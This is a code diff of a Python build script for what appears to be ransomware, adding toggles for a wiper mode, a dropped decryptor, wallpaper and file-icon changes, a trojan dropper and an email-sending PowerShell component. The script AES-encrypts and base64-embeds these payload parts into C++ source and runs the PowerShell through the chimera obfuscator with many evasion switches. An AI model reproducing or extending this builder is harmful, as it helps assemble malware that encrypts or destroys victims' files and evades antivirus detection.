@@ -15,18 +15,36 @@ except ImportError:
 emailSenderLastPath = ''
 key = ''
 iv = ''
-FAST_TEST = False
+DEBUG = False
 CUSTOM_FILE = False
 DROPRUN_TROJAN = False
+WIPER = False
+DROP_DECRYPTOR = False
+CHANGE_WALLPAPER = False
+DEBUG_SEND_EMAIL = False
+SEND_EMAIL = False
+CHANGE_FILE_ICON = False
 for line in open('../commons/common.h', 'r').readlines():
     if '#define DEBUG' in line and 'true' in line:
-        FAST_TEST = True
+        DEBUG = True
     if '#define EMAILSENDER' in line:
         emailSenderLastPath = line.split('"')[1].replace('\\\\', '\\')
     if '#define DROP_CUSTOM_FILE' in line and 'true' in line:
         CUSTOM_FILE = True
     if '#define DROPRUN_TROJAN_FILE' in line and 'true' in line:
         DROPRUN_TROJAN = True
+    if '#define WIPER' in line and 'true' in line:
+        WIPER = True
+    if '#define CHANGE_WALLPAPER' in line and 'true' in line:
+        CHANGE_WALLPAPER = True
+    if '#define DROP_DECRYPTOR' in line and 'true' in line:
+        DROP_DECRYPTOR = True
+    if '#define DEBUG_SEND_EMAIL' in line and 'true' in line:
+        DEBUG_SEND_EMAIL = True
+    if '#define SEND_EMAIL' in line and 'true' in line:
+        SEND_EMAIL = True
+    if '#define CHANGE_FILE_ICON' in line and 'true' in line:
+        CHANGE_FILE_ICON = True
     if '#define IV' in line:
         iv = line.split('"')[1].encode()
     if '#define KEY' in line and '#define KEYOFKEY' not in line:
@@ -86,7 +104,7 @@ def getEmailSenderCryptedAndEncoded(filePath):
     shellText = shellText.replace("PATH", encryptString(emailSenderLastPath))
 
     open('emailSenderReal.ps1', 'w').write(shellText)
-    if not FAST_TEST or not os.path.exists('chimera.ps1'):
+    if not DEBUG or not os.path.exists('chimera.ps1'):
         if platform.machine().endswith('64'):
             os.system(f'start /wait "" "%PROGRAMFILES%\\Git\\bin\\sh.exe" --login -i -c "./chimera.sh -f ./emailSenderReal.ps1 -o chimera.ps1 -l 5 -v -t -c -i -h -s -b -j -g -k -p -d"')
         else:
@@ -95,7 +113,7 @@ def getEmailSenderCryptedAndEncoded(filePath):
 
     cipher = AES.new(key, AES.MODE_CBC, iv)
     returner = base64.b64encode(cipher.encrypt(pad(open('chimera.ps1', 'rb').read(), AES.block_size))).decode()
-    if not FAST_TEST:
+    if not DEBUG:
         os.remove('chimera.ps1')
     return returner
 
@@ -118,12 +136,11 @@ for line in main_cppRead.readlines():
     if line.split('=')[0] == 'string DataDecryptorContent ' and line.split('=')[1] != ' \n':
         content += 'string DataDecryptorContent = \n'
         decryptorPath = line.split('"')[1]
-
-        cipher = AES.new(key, AES.MODE_CBC, iv)
-        decryptorContent = base64.b64encode(cipher.encrypt(pad(base64.b64encode(open(decryptorPath, 'rb').read()), AES.block_size))).decode()
-        #print(f'{key} : {iv}\n{decryptorContent}\n')
-        #exit()
-
+        decryptorContent = base64.b64encode('nothing to read here :) - Tuga'.encode()).decode()
+        if DROP_DECRYPTOR and not WIPER:
+            checkFileLocation(decryptorPath, i)
+            cipher = AES.new(key, AES.MODE_CBC, iv)
+            decryptorContent = base64.b64encode(cipher.encrypt(pad(base64.b64encode(open(decryptorPath, 'rb').read()), AES.block_size))).decode()
         open('preCompilation.tmp', 'a').write("decryptor=" + decryptorPath + "\n")
         for subContent in split_str(decryptorContent, 1000, False):
             content += '"'+subContent+'"\n'
@@ -133,8 +150,11 @@ for line in main_cppRead.readlines():
     if line.split('=')[0] == 'string WallpaperContent ' and line.split('=')[1] != ' \n':
         content += 'string WallpaperContent = \n'
         wallpaperPath = line.split('"')[1]
-        cipher = AES.new(key, AES.MODE_CBC, iv)
-        wallpaperContent = base64.b64encode(cipher.encrypt(pad(open(wallpaperPath, 'rb').read(), AES.block_size))).decode()
+        wallpaperContent = base64.b64encode('nothing to read here :) - Tuga'.encode()).decode()
+        if CHANGE_WALLPAPER:
+            checkFileLocation(wallpaperPath, i)
+            cipher = AES.new(key, AES.MODE_CBC, iv)
+            wallpaperContent = base64.b64encode(cipher.encrypt(pad(open(wallpaperPath, 'rb').read(), AES.block_size))).decode()
         open('preCompilation.tmp', 'a').write("wallpaper=" + wallpaperPath + "\n")
         for subContent in split_str(wallpaperContent, 500, False):
             content += '"'+subContent+'"\n'
@@ -144,7 +164,10 @@ for line in main_cppRead.readlines():
     if line.split('=')[0] == 'string EmailSenderContent ' and line.split('=')[1] != ' \n':
         content += 'string EmailSenderContent = \n'
         emailSenderPath = line.split('"')[1]
-        emailSenderContent = getEmailSenderCryptedAndEncoded(emailSenderPath)
+        emailSenderContent = base64.b64encode('nothing to read here :) - Tuga'.encode()).decode()
+        if (DEBUG_SEND_EMAIL if DEBUG else SEND_EMAIL):
+            checkFileLocation(emailSenderPath, i)
+            emailSenderContent = getEmailSenderCryptedAndEncoded(emailSenderPath)
         open('preCompilation.tmp', 'a').write("emailsender=" + emailSenderPath + "\n")
         for subContent in split_str(emailSenderContent, 500, False):
             content += '"'+subContent+'"\n'
@@ -154,8 +177,11 @@ for line in main_cppRead.readlines():
     if line.split('=')[0] == 'string FileIconContent ' and line.split('=')[1] != ' \n':
         content += 'string FileIconContent = \n'
         fileIconPath = line.split('"')[1]
-        cipher = AES.new(key, AES.MODE_CBC, iv)
-        fileIconContent = base64.b64encode(cipher.encrypt(pad(open(fileIconPath, 'rb').read(), AES.block_size))).decode()
+        fileIconContent = base64.b64encode('nothing to read here :) - Tuga'.encode()).decode()
+        if CHANGE_FILE_ICON:
+            checkFileLocation(fileIconPath, i)
+            cipher = AES.new(key, AES.MODE_CBC, iv)
+            fileIconContent = base64.b64encode(cipher.encrypt(pad(open(fileIconPath, 'rb').read(), AES.block_size))).decode()
         open('preCompilation.tmp', 'a').write("fileicon=" + fileIconPath + "\n")
         for subContent in split_str(fileIconContent, 500, False):
             content += '"'+subContent+'"\n'
